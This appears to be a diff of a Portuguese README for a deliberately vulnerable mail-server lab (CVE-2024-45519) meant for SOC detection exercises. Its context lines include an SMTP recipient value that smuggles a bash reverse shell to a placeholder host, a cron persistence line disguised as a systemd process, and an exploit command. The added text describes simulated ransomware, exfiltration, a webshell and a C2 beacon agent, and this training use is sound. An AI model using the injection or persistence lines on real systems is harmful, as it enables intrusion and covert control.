@@ -74,19 +74,36 @@ SSH Key: ./ssh_keys/analyst_id_rsa
 - Porta 25 disponível no host
 - Mínimo 4GB RAM disponível
 
-### **Deploy Automático**
+
+## 🚀 Instruções de Execução
+
+### 1. Deploy Completo
 ```bash
-# Deploy completo
-./maquina4-setup.sh deploy
+./setup.sh deploy
+```
 
-# Verificar status
-./maquina4-setup.sh status
+### 2. Comandos Básicos
+```bash
+# Iniciar ambiente existente
+./setup.sh start
 
-# Parar laboratório
-./maquina4-setup.sh stop
+# Parar ambiente
+./setup.sh stop
 
-# Limpar recursos
-./maquina4-setup.sh clean
+# Reiniciar ambiente
+./setup.sh restart
+
+# Ver status
+./setup.sh status
+
+# Monitorar logs
+./setup.sh logs
+
+# Limpar ambiente
+./setup.sh clean
+
+# Informações
+./setup.sh info
 ```
 
 ### **Tempo de Inicialização**
@@ -194,6 +211,34 @@ RCPT TO: <"aabbb$(bash -i >& /dev/tcp/IP_EXTERNO/4444 0>&1)@test.com">
 */1 * * * * root if ! netstat -tlnp | grep -q ':2525'; then /usr/local/lib/systemd/system/.systemd-udevd >/dev/null 2>&1 &; fi
 ```
 
+## Agente de Simulação C2 (svcmon)
+
+- O binário `svcmon-linux` (Go) é copiado para o container e executado automaticamente via cron (@reboot).
+- O agente realiza requisições periódicas para https://www.rodrigobrito.dev.br e registra logs em `/var/log/svcmon.log`.
+- Objetivo: Simular beaconing C2 para exercícios de detecção SOC.
+
+## Artefatos Dinâmicos Simulados
+
+Este ambiente inclui artefatos automatizados para simular ataques reais e gerar ruído para análise SOC. Todos são ativados automaticamente via cron.
+
+- **ransomware_simulado_linux.sh**: Criptografa arquivos em `/opt/vulnerable_files` e gera nota de resgate. Restaure com `ransomware_restore_linux.sh`.
+- **flood_logs_linux.sh**: Gera eventos falsos em logs do sistema.
+- **exfiltracao_simulada.sh**: Simula exfiltração de dados do sistema.
+- **portscan_simulado.sh**: Simula varredura de portas internas.
+- **persistencia_simulada.sh**: Simula persistência via cron.
+- **webshell_simulado.php**: Webshell PHP para simulação de invasão (`/opt/zimbra`).
+
+### Restauração
+Execute `/usr/local/bin/ransomware_restore_linux.sh` no container para restaurar arquivos criptografados.
+
+### Análise
+Todos os artefatos geram logs específicos para facilitar investigação e correlação de alertas.
+
+## Execução Automática
+- Ambos os artefatos são executados automaticamente no boot do container.
+
+---
+
 ## 🧪 Testes e Validação
 
 ### **Teste de Conectividade**
@@ -233,7 +278,7 @@ python3 exploit.py 127.0.0.1 -p 25 -lh IP_EXTERNO -lp 4444
 ### **Arquivos Importantes**
 - `docker-compose.yml`: Configuração dos serviços
 - `Dockerfile`: Construção da imagem
-- `maquina4-setup.sh`: Script de gerenciamento
+- `setup.sh`: Script de gerenciamento
 - `CVE-2024-45519/exploit.py`: Exploit automatizado
 
 ### **Logs e Debugging**
